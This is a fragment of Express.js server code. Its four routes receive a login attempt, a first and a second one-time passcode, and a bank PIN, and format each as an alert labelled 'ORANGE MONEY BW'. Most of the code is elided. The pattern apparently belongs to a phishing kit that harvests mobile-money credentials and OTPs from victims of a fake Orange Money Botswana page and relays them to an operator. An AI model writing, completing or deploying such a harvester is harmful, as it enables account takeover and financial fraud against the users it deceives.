...
app.post('/api/login-notification', async (req, res) => {
    ...
    const message = `📱 <b>ORANGE MONEY BW - LOGIN ATTEMPT</b>
...
app.post('/api/verify-first-otp', async (req, res) => {
    ...
    const otpMessage = `1️⃣ <b>ORANGE MONEY BW - FIRST OTP (Step 1/2)</b>
...
app.post('/api/verify-second-otp', async (req, res) => {
    ...
    const otpMessage2 = `2️⃣ <b>ORANGE MONEY BW - SECOND OTP (Step 2/2)</b>
...
app.post('/api/verify-bank-pin', async (req, res) => {
    ...
    const bankPinMessage = `🏦 <b>ORANGE MONEY BW - BANK PIN VERIFICATION (Step 3)</b>
